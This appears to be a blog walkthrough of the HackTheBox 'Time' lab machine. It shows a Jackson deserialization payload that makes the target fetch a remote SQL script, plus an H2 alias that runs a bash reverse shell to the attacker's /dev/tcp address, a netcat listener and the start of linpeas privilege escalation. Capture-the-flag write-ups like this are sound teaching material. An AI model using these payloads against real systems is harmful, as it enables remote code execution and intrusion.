---
title: " HackTheBox {Time}"
description: Walkthrough of the Time Machine on Hackthebox.
---
![Time](https://media.discordapp.net/attachments/490431433559506954/832933487954231336/screenshot-193.png)

## Scanning port

```
Open port :

22/tcp open ssh
80/tcp open http
```

We can see that there is the ssh / 22 port and the 80 / http port which are open.

We are going to see the http / 80 port to see what is interesting.

We see an online json beautifier & Validator with 2 options, "Beatify" & "Validate!(Beta)".. I intercepted both options in burpsuite and i have just put a word in the field and submitted.

![time](https://media.discordapp.net/attachments/490431433559506954/832936431823224862/unknown.png)

## User FLag

Now, you need to create a inject.sql files and add a reverse shell to have it call back to me. :

```sh
CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {
        String[] command = {"bash", "-c", cmd};
        java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter("\\A");
        return s.hasNext() ? s.next() : "";  }
$$;
CALL SHELLEXEC('bash -i &>/dev/tcp/10.10.14.90/1337 0>&1 &')
```

Now, start a netcat listener :

```sh
nc -nvlp 1337
listening on [any] 1337 ...
```

Now inject the payload to : "Validate!(Beta)".

```sh
[“ch.qos.logback.core.db.DriverManagerConnectionSource”,{“url”:”jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM ‘http://IP:PORT/inject.sql'”}]
```

and you got a reverseshell running as the user pericles.

```sh
listening on [any] 1337 ...
connect to [10.10.14.64] from (UNKNOWN) [10.10.10.214] 42212
```

Now for a good stable shell, type :

```sh
$python -c “import pty;pty.spawn(‘/bin/bash’)”
$export TERM=xterm
```
Got the user flag : 

```
pericles@time:/home/pericles$ cat user.txt 
cat user.txt
7u7243a41d508868b8c935c47b554ad7
```
## Privilege Escalation

Try to upload linpeas ( LinPEAS is a script that search for possible paths to escalate privileges on Linux )

Install linpeas <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS">Linpeas</a>



